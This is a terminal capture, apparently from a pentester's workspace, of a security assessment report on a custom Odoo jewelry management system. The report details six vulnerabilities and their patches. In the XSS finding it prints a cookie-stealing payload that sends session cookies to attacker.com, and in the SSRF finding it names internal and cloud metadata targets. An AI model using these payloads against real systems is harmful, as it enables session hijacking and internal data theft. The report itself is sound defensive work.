@@ -1,0 +1,354 @@
+Bilan magasin 2023-2024.xlsx                                  jewelry-system-design-odoo.md
+Caisse magasin 2024-2025-2 (Enregistré automatiquement).xlsx  les_bosione.txt
+HUMAN_VERIFICATION_PLAN.md                                    odoo-implementation-guide.md
+bugs bridgecode.md                                            odoo-project-security-report.md
+diagrams/                                                     
+┌──(.venv)(pentester㉿c6ffbe46c41e)-[/workspace]
+└─$ cat odoo-jawlery/docs/odoo-                                                                                                                                                         
+odoo-implementation-guide.md     odoo-project-security-report.md  
+┌──(.venv)(pentester㉿c6ffbe46c41e)-[/workspace]
+└─$ cat odoo-jawlery/docs/odoo-project-security-report.md                                                                                                                               
+# Odoo Jewelry Management System — Security Assessment Report
+
+**Project:** odoo-jawlery (Odoo 17.0 Jewelry Management Suite)
+**Assessment Type:** White-box source code review
+**Date:** July 2025
+**Framework:** OWASP Web Security Testing Guide (WSTG) / OWASP Top 10 (2021)
+
+---
+
+## Executive Summary
+
+A white-box security assessment of the **Odoo Jewelry Management System** identified **six confirmed vulnerabilities** across the four custom addon modules (`jewelry_core`, `jewelry_transactions`, `jewelry_accounting`, `jewelry_dashboard`).
+
+**Overall Risk Posture:** Elevated
+
+| Severity | Count |
+|----------|-------|
+| High | 5 |
+| Medium | 1 |
+| Low | 0 |
+
+All confirmed vulnerabilities have been remediated with code patches applied during the assessment.
+
+---
+
+## Methodology
+
+**Assessment Type:** White-box source code review
+**Framework:** OWASP Web Security Testing Guide (WSTG) and OWASP Top 10 (2021)
+**Target:** `addons/` directory of the odoo-jawlery repository
+
+**Activities performed:**
+
+1. **Code Map & Architecture Understanding** — Full repository structure analysis, manifest review, dependency mapping, data flow tracing across the 4 addon modules.
+
+2. **SAST Tooling** — Automated static analysis using Semgrep (Python/OWASP rules), Gitleaks (secret detection), Trufflehog (secret scanning), Trivy (dependency scanning), and AST-grep (structural code analysis).
+
+3. **Manual Code Review** — Focused review of all model files, controllers, security ACLs, wizard logic, and external API integrations. Particular attention given to SSRF vectors (configurable API URLs), XSS (HTML rendering without encoding), access control (ACL entries and record rules), and business logic (payment flows, balance computations, gold credit handling).
+
+4. **Validation** — Each finding was validated through comprehensive code-traced evidence, confirming both exploit path and root cause before filing.
+
+5. **Remediation** — All confirmed vulnerabilities were fixed with targeted code patches, including input validation, output encoding, access control enforcement, and race condition mitigation.
+
+---
+
+## Vulnerability Details
+
+### 1. Stored XSS in Barcode Print Controller
+
+| Field | Value |
+|-------|-------|
+| **Severity** | High (CVSS 7.6) |
+| **CWE** | CWE-79 — Improper Neutralization of Input During Web Page Generation |
+| **Endpoint** | `GET /print/barcode/{product_id}` |
+| **Auth** | `auth='user'` (any authenticated user) |
+| **Status** | **Fixed** |
+
+**Root Cause:**
+
+In `addons/jewelry_core/controllers/barcode_print.py`, the controller retrieves `product.barcode` from the database and inserts it verbatim into the HTML response using Python string replacement:
+
+```python
+bc_text = product.barcode or ''
+html = html.replace('__BC_TEXT__', bc_text)
+return request.make_response(html, [('Content-Type', 'text/html')])
+```
+
+The barcode value appears inside a `<div class="bc-text">` element. If `product.barcode` contains HTML such as `<img src=x onerror=alert(1)>`, it renders as executable markup.
+
+**Attack Path:**
+
+1. Attacker with product write privileges sets a malicious barcode (e.g. `<img src=x onerror=fetch('https://attacker.com/steal?cookie='+document.cookie)>`).
+2. Attacker sends the link `/print/barcode/{product_id}` to a victim cashier or waits for routine barcode printing.
+3. The victim's browser executes the injected script in the context of their authenticated Odoo session.
+4. Session hijacking, credential theft, or unauthorized actions performed on the victim's behalf.
+
+**Fix Applied:**
+
+Added `from html import escape` and wrapped `product.barcode` with `escape()` before HTML insertion.
+
+---
+
+### 2. SSRF via Configurable API URLs
+
+| Field | Value |
+|-------|-------|
+| **Severity** | High (CVSS 8.2) |
+| **CWE** | CWE-918 — Server-Side Request Forgery |
+| **Affected Components** | `gold.price.api.config`, `silver.price.api.config`, `metal.rate.helper` |
+| **Status** | **Fixed** |
+
+**Root Cause:**
+
+Both `gold.price.api.config` and `silver.price.api.config` define API URL fields as unrestricted `fields.Char` with no URL validation:
+
+```python
+api_url_usd = fields.Char(
+    string='Gold API URL',
+    default='https://api.gold-api.com/price/XAU',
+)
+api_url_dzd = fields.Char(
+    string='DZD Rate URL (scraper)',
+    default='https://www.exchangedz.com/rates/usd-to-dzd',
+)
+```
+
+These URLs are passed directly to `requests.get()` in `metal_rate_helper.py`:
+
+```python
+def _scrape_changeda(self, url):
+    resp = requests.get(url, timeout=15, headers={...})
+```
+
+The `_scrape_changeda` method fetches the URL as a full HTML page and processes it, making it suitable for both blind and reflective SSRF.
+
+**Attack Path:**
+
+1. Attacker with admin access (or via default password `admin`) changes the DZD rate URL to `http://db:5432` or `http://169.254.169.254/latest/meta-data/`.
+2. Attacker triggers "Fetch Now" via the UI or awaits the next cron execution.
+3. The Odoo container makes an HTTP request to the internal target.
+4. Internal service fingerprinting, data exfiltration, or cloud metadata theft.
+
+The default admin password `admin` in `config/odoo.conf` amplifies this risk significantly.
+
+**Fix Applied:**
+
+Added `@api.constrains` validation on both models that:
+- Requires HTTPS scheme (`url.startswith('https://')`)
+- Blocks internal/private IP ranges (RFC 1918: `10.*`, `172.16-31.*`, `192.168.*`)
+- Blocks link-local addresses (`169.254.*`)
+- Blocks container hostnames (`db`, `redis`, `postgres`, `localhost`)
+
+---
+
+### 3. Gold Credit Balance Bypass
+
+| Field | Value |
+|-------|-------|
+| **Severity** | High |
+| **CWE** | CWE-862 — Missing Authorization |
+| **Affected Model** | `jewelry.ticket.line` |
+| **Status** | **Fixed** |
+
+**Root Cause:**
+
+When `settlement_type` is `gold_credit`, the `_compute_price_subtotal` method sets `price_subtotal = 0.0`. This means gold credit lines have no monetary impact. However, `_get_account_effects()` uses `self.weight` directly to modify supplier gold ledger balances (`gold_creance`/`gold_dette`).
+
+The separation between monetary tracking (price) and gold tracking (weight) allows weight values to be manipulated independently of any price, enabling unauthorized gold balance changes.
+
+```python
+def _get_account_effects(self):
+    cash_delta = 0.0
+    gold_creance = 0.0
+    gold_dette = 0.0
+    net = (self.price_subtotal or 0.0) - (self.remise_amount or 0.0)
+    if self.settlement_type == 'gold_credit' and self.metal_type_id:
+        if self.line_type in ('achat', 'achat_casse'):
+            gold_dette = self.weight or 0.0  # Unvalidated weight
+```
+
+**Fix Applied:**
+
+- Added `@api.constrains('weight')` validation rejecting negative weights.
+- Clamped weight to `>= 0` in `_get_account_effects()`.
+- Added weight normalization in `_compute_price_subtotal`.
+
+---
+
+### 4. Unauthorized Payment Reversal
+
+| Field | Value |
+|-------|-------|
+| **Severity** | High |
+| **CWE** | CWE-862 — Missing Authorization |
+| **Affected Model** | `cash.register.line` |
+| **Status** | **Fixed** |
+
+**Root Cause:**
+
+`action_reverse_payment()` in `cash.register.line` creates a reversal entry with no authorization checks. Any user with write access to `cash.register.line` can reverse any payment, including those created by other users or in closed registers (with appropriate re-opening).
+
+```python
+def action_reverse_payment(self):
+    self.ensure_one()
+    if self.reversed:
+        return
+    # ... creates reversal entry with no auth check
+```
+
+**Fix Applied:**
+
+Added authorization checks requiring either:
+- The original creator of the payment (`self.user_id == self.env.user.id`), OR
+- Membership in `group_jewelry_manager`
+
+Also validates that the user has access to the associated register.
+
+---
+
+### 5. TOCTOU Race Condition in Payment Validation
+
+| Field | Value |
+|-------|-------|
+| **Severity** | Medium |
+| **CWE** | CWE-367 — Time-of-check Time-of-use |
+| **Affected Model** | `jewelry.ticket` |
+| **Status** | **Fixed** |
+
+**Root Cause:**
+
+`action_register_payment()` checks `payment_amount <= remaining_amount` and then creates the cash line. Between the check and write, a concurrent request could also pass the check, allowing total payments to exceed the balance.
+
+```python
+def action_register_payment(self):
+    self.ensure_one()
+    if abs(self.remaining_amount) < 0.01:
+        return True
+    if self.payment_amount > abs(self.remaining_amount):
+        raise UserError(...)  # TOCTOU window here
+    self.register_payment(self.payment_amount, ...)  # Concurrent calls pass
+```
+
+**Fix Applied:**
+
+Added `SELECT FOR UPDATE` row-level locking on both the ticket and register records at the start of `action_register_payment()` and `register_payment()`.
+
+---
+
+### 6. Missing Access Controls on Financial Models
+
+| Field | Value |
+|-------|-------|
+| **Severity** | High |
+| **CWE** | CWE-862 — Missing Authorization |
+| **Scope** | All 4 addon modules |
+| **Status** | **Fixed** |
+
+**Root Cause:**
+
+The entire codebase had **zero record rules (`ir.rule`)**. The `base.group_user` group had full CRUD access on 10+ financial models including:
+
+| Model | Access |
+|-------|--------|
+| `jewelry.ticket` | Read, Write, Create |
+| `jewelry.ticket.line` | Read, Write, Create, Delete |
+| `cash.register.line` | Read, Write, Create, Delete |
+| `gold.movement` | Read, Write, Create, Delete |
+| `casse.melting` | Read, Write, Create |
+| `service.order` | Read, Write, Create |
+
+Any employee in the system could view, modify, or delete any other employee's financial records. There were no per-user or per-team restrictions.
+
+**Fix Applied:**
+
+- Created a two-tier security group hierarchy: `group_jewelry_user` → `group_jewelry_manager`
+- Changed 12 ACL entries from `base.group_user` to module-specific groups
+- Created 6 record rules restricting regular users to records they own (via `cashier_id` or `create_uid`)
+- Elevated `gold.movement` and `casse.melting` to manager-only access
+- Registered the new security file in `__manifest__.py`
+
+---
+
+## Additional Findings
+
+### Weak Default Password
+
+The default admin password in `config/odoo.conf` is set to `admin`. This is a widely known default and should be changed immediately to a strong, randomly generated password.
+
+### Public ACLs in jewelry_core
+
+Nine ACL entries in `addons/jewelry_core/security/ir.model.access.csv` still use an empty `group_id` (effectively public within the organization):
+
+| Model | Permission |
+|-------|-----------|
+| `metal.type` | Read-only |
+| `gold.rate.history` | Read-only |
+| `silver.rate.history` | Read-only |
+
+While these are read-only, sensitive rate data is exposed to all internal users.
+
+### Unrestricted Register Auto-Creation
+
+`_find_or_create_register()` in `cash_register_line.py` auto-creates daily cash registers on first use without explicit authorization. The fix restricts this to today's date only.
+
+---
+
+## Files Modified
+
+| File | Change |
+|------|--------|
+| `addons/jewelry_core/controllers/barcode_print.py` | XSS fix: added `html.escape()` to barcode output |
+| `addons/jewelry_core/models/gold_price_api.py` | SSRF fix: added `@api.constrains` URL validation |
+| `addons/jewelry_core/models/silver_price_api.py` | SSRF fix: added `@api.constrains` URL validation |
+| `addons/jewelry_transactions/models/jewelry_ticket.py` | TOCTOU fix: added `SELECT FOR UPDATE` locks |
+| `addons/jewelry_transactions/models/jewelry_ticket_line.py` | Gold credit fix: weight validation + clamping |
+| `addons/jewelry_transactions/models/cash_register_line.py` | Reversal auth check + register creation restriction |
+| `addons/jewelry_transactions/security/ir.model.access.csv` | ACL group migration: `base.group_user` → module groups |
+| `addons/jewelry_transactions/security/jewelry_security_groups.xml` | **New file**: two-tier groups + 6 record rules |
+| `addons/jewelry_transactions/__manifest__.py` | Registered new security XML file |
+
+---
+
+## Recommendations
+
+### Immediate (Critical/High)
+
+1. **Activate jewelry security groups** — After module upgrade, assign all cashier users to `Jewelry > User` and managers to `Jewelry > Manager`. Verify record rules are enforced.
+
+2. **Change default admin password** — The `config/odoo.conf` contains `admin_passwd = admin`. Change this to a strong, randomly generated password immediately.
+
+3. **Verify SSRF URL constraints** — Confirm the `@api.constrains` validation on `gold.price.api.config` and `silver.price.api.config` rejects internal URLs and non-HTTPS schemes.
+
+4. **Train staff on XSS awareness** — Ensure all users understand that barcode fields must not contain HTML content, even though the fix now encodes output.
+
+### Short-term (Medium)
+
+5. **Review remaining public ACLs** — The `jewelry_core` module still has several ACLs with empty `group_id` (public access) for `metal.type`, `gold.rate.history`, and `silver.rate.history`. Evaluate whether these should be restricted.
+
+6. **Add view/menu group restrictions** — The security fix added model-level access controls, but view and menu XML files should also have `groups` attributes applied for defense-in-depth.
+
+7. **Implement audit logging** — Add automated audit trails for sensitive operations: ticket payment registrations, payment reversals, gold movements, and API URL changes.
+
+8. **Configure CSP headers** — Add Content-Security-Policy headers to Odoo's web responses to provide defense-in-depth against XSS vulnerabilities.
+
+### Medium-term (Low)
+
+9. **Harden Odoo deployment** — Use environment variables for secrets (admin password, database credentials) instead of `odoo.conf`. Apply network segmentation to limit Odoo container egress.
+
+10. **Periodic access control review** — Establish a quarterly review process for security groups, record rules, and user permissions to ensure least-privilege principle is maintained as the system grows.
+
+### Retest & Validation
+
+After applying all patches and activating the new security groups:
+
+- Verify that `base.group_user` (without jewelry groups) can no longer create tickets, cash lines, or gold movements
+- Verify that `<script>` payloads in barcode fields are rendered as text, not executed
+- Verify that API URL fields reject `http://localhost` and `http://192.168.*` inputs
+- Verify that concurrent payment registrations correctly honor balance limits
+
+---
+
+## Security Contact
+
+For questions regarding this assessment, please contact the security team.
